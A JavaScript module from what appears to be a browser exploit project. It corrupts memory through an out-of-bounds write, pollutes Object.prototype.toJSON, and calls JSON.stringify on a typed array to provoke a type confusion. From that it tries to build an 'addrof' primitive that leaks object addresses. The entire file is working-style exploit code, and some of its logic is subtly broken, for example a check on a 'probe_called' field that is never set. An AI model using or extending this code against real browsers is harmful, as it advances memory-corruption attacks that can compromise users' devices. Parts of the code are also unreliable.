// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v13_ConsistentLogging)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL = "OriginalHeisenbug_TypedArrayAddrof_v13_ConsistentLogging";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let probe_calls_details_array_v13 = []; // Array para armazenar detalhes de cada chamada
let object_to_leak_A_v13 = null;
let object_to_leak_B_v13 = null;
let victim_typed_array_ref_v13 = null;
let probe_call_count_v13 = 0;

function toJSON_TA_Probe_ConsistentLogging() {
    probe_call_count_v13++;
    let current_call_details = {
        call_number: probe_call_count_v13,
        probe_variant: "TA_Probe_Addrof_v13_ConsistentLogging",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
        this_is_prev_probe_return: false, // Nova flag
        writes_attempted_on_this: false
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v13);
        
        // Checar se 'this' é o objeto retornado pela chamada anterior da sonda
        if (probe_call_count_v13 > 1 && typeof this === 'object' && this !== null && this.probe_marker_from_call === (probe_call_count_v13 - 1)) {
            current_call_details.this_is_prev_probe_return = true;
        }

        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. 'this' === victim? ${current_call_details.this_is_victim_ref}. 'this' is prev_probe_return? ${current_call_details.this_is_prev_probe_return}`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'!`, "vuln");
            
            // Se o 'this' confuso for o objeto retornado pela sonda anterior, ainda é interessante, mas não a vítima.
            if (current_call_details.this_is_prev_probe_return) {
                logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Confused 'this' IS the object returned by the previous probe call.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Attempting addrof writes on this confused 'this'...`, "warn");
            if (object_to_leak_A_v13) {
                this[0] = object_to_leak_A_v13;
            }
            if (object_to_leak_B_v13) {
                this[1] = object_to_leak_B_v13;
            }
            current_call_details.writes_attempted_on_this = true;
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: Writes to confused 'this' attempted. 'this' keys now: ${Object.keys(this).join(',')}`, "info");


        } else if (current_call_details.this_is_victim_ref) {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' is victim, type is ${current_call_details.this_type_in_toJSON}.`, "info");
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: 'this' (type: ${current_call_details.this_type_in_toJSON}) is not victim and not prev_probe_return.`, "warn");
        }

    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: ERROR in probe: ${e.name} - ${e.message}`, "error");
    }
    
    probe_calls_details_array_v13.push({ ...current_call_details }); 
    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Added to probe_calls_details_array_v13. Returning new marker object.`, "dev_verbose");

    // Retornar um objeto novo e simples, com um marcador para rastreamento
    return { "probe_marker_from_call": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_ConsistentLogging() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, ConsistentLogging) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL} Init...`;

    probe_calls_details_array_v13 = []; // Resetar array de detalhes global
    probe_call_count_v13 = 0;         // Resetar contador global
    victim_typed_array_ref_v13 = null; 
    object_to_leak_A_v13 = { marker: "ObjA_TA_v13cl", id: Date.now() }; 
    object_to_leak_B_v13 = { marker: "ObjB_TA_v13cl", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let last_captured_probe_details = null; // Detalhes da última chamada, para o objeto de resultado
    
    let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Not attempted or Heisenbug/write failed." };
    let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Not attempted or Heisenbug/write failed." };
    
    const fillPattern = 0.13131313131313;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        // ... (OOB Init e escrita crítica)
        if (!oob_array_buffer_real && typeof oob_write_absolute !== 'function') {
            throw new Error("OOB Init failed or oob_write_absolute not available.");
        }
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        logS3(`   OOB corruption target in oob_array_buffer_real: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_TEST);

        logS3(`STEP 1: Writing CRITICAL value ${toHex(OOB_WRITE_VALUE)} to oob_array_buffer_real[${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100);

        victim_typed_array_ref_v13 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v13.buffer); 
        
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) {
            float64_view_on_underlying_ab[i] = fillPattern + i;
        }

        logS3(`STEP 2: victim_typed_array_ref_v13 (Uint8Array) created. View filled.`, "test", FNAME_CURRENT_TEST);
        logS3(`   Attempting JSON.stringify on victim_typed_array_ref_v13 with ${toJSON_TA_Probe_ConsistentLogging.name}...`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSON_TA_Probe_ConsistentLogging,
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v13)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v13); 
            
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + (stringifyOutput.length > 100 ? "..." : "") : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // Captura os detalhes da última chamada da sonda do array global
            if (probe_calls_details_array_v13.length > 0) {
                last_captured_probe_details = probe_calls_details_array_v13[probe_calls_details_array_v13.length - 1];
            }
            logS3(`  ALL Probe Call Details: ${JSON.stringify(probe_calls_details_array_v13)}`, "dev");
            logS3(`  Captured LAST probe call details: ${last_captured_probe_details ? JSON.stringify(last_captured_probe_details) : 'N/A (probe likely not called or error)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedByCapturedDetails = false;
            if (last_captured_probe_details && 
                last_captured_probe_details.probe_called &&
                last_captured_probe_details.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmedByCapturedDetails = true;
                logS3(`  HEISENBUG ON 'this' OF PROBE CONFIRMED by captured last details! 'this' type: ${last_captured_probe_details.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
                logS3(`    In confused probe (call #${last_captured_probe_details.call_number}), 'this' === victim? ${last_captured_probe_details.this_is_victim_ref}`, "info");
                logS3(`    'this' was prev_probe_return? ${last_captured_probe_details.this_is_prev_probe_return}`, "info");
                logS3(`    Writes attempted on this confused 'this'? ${last_captured_probe_details.writes_attempted_on_this}`, "info");
            } else {
                let msg = "Heisenbug on 'this' of probe NOT confirmed by captured last details.";
                if(last_captured_probe_details && last_captured_probe_details.this_type_in_toJSON) {
                    msg += ` 'this' type in last probe: ${last_captured_probe_details.this_type_in_toJSON}.`;
                } else if (!last_captured_probe_details) {
                    msg += " Captured last probe details are null.";
                }
                logS3(`  ALERT: ${msg}`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking float64_view_on_underlying_ab...", "warn", FNAME_CURRENT_TEST);
            // ... (Lógica de verificação de addrof_result_A e addrof_result_B - mantida igual à v12, apenas atualizando nomes de variáveis se necessário)
            const val_A_double = float64_view_on_underlying_ab[0];
            addrof_result_A.leaked_address_as_double = val_A_double;
            let temp_buf_A = new ArrayBuffer(8); new Float64Array(temp_buf_A)[0] = val_A_double;
            addrof_result_A.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_A)[0], new Uint32Array(temp_buf_A)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[0] (for ObjA): ${val_A_double} (${addrof_result_A.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);

            if (val_A_double !== (fillPattern + 0) && val_A_double !== 0 &&
                (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[0] (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_A.success = true;
                addrof_result_A.message = "Heisenbug (ConsistentLogging) observed & view[0] read suggests a pointer for ObjA.";
            } else {
                addrof_result_A.message = "View[0] read does not look like a pointer for ObjA or buffer was unchanged.";
                if (heisenbugConfirmedByCapturedDetails) addrof_result_A.message = "Heisenbug on 'this' of probe observed, but " + addrof_result_A.message;
                if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Value matches initial fillPattern)";
            }

            const val_B_double = float64_view_on_underlying_ab[1];
            addrof_result_B.leaked_address_as_double = val_B_double;
            let temp_buf_B = new ArrayBuffer(8); new Float64Array(temp_buf_B)[0] = val_B_double;
            addrof_result_B.leaked_address_as_int64 = new AdvancedInt64(new Uint32Array(temp_buf_B)[0], new Uint32Array(temp_buf_B)[1]);
            logS3(`  Value read from float64_view_on_underlying_ab[1] (for ObjB): ${val_B_double} (${addrof_result_B.leaked_address_as_int64.toString(true)})`, "leak", FNAME_CURRENT_TEST);
            
            if (val_B_double !== (fillPattern + 1) && val_B_double !== 0 &&
                (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! POTENTIAL POINTER READ at view[1] (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                addrof_result_B.success = true;
                addrof_result_B.message = "Heisenbug (ConsistentLogging) observed & view[1] read suggests a pointer for ObjB.";
            } else {
                addrof_result_B.message = "View[1] read does not look like a pointer for ObjB or buffer was unchanged.";
                 if (heisenbugConfirmedByCapturedDetails) addrof_result_B.message = "Heisenbug on 'this' of probe observed, but " + addrof_result_B.message;
                if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Value matches initial fillPattern)";
            }


            if (addrof_result_A.success || addrof_result_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedByCapturedDetails) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL}: Heisenbug Sonda OK, Addr Falhou`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL}: Heisenbug Sonda Falhou?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or addrof logic: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.${ppKey} restored.`, "info", FNAME_CURRENT_TEST);
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V13_CL} CRITICALLY FAILED`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls made: ${probe_call_count_v13}`, "info", FNAME_CURRENT_TEST);
        // ... (logs de resultado final addrof_A, addrof_B)
         logS3(`Addrof A Result (view[0]): Success=${addrof_result_A.success}, Msg='${addrof_result_A.message}'`, addrof_result_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_A.leaked_address_as_int64){
            logS3(`  Addrof A (Int64): ${addrof_result_A.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        logS3(`Addrof B Result (view[1]): Success=${addrof_result_B.success}, Msg='${addrof_result_B.message}'`, addrof_result_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result_B.leaked_address_as_int64){
            logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        object_to_leak_A_v13 = null;
        object_to_leak_B_v13 = null;
        victim_typed_array_ref_v13 = null; 
        probe_calls_details_array_v13 = []; 
        probe_call_count_v13 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_captured_probe_details, // Retorna o último detalhe capturado
        addrof_A_attempt_result: addrof_result_A,
        addrof_B_attempt_result: addrof_result_B,
        all_probe_calls_details: probe_calls_details_array_v13, // Retorna todos os detalhes para análise
        total_probe_calls: probe_call_count_v13
    };
}
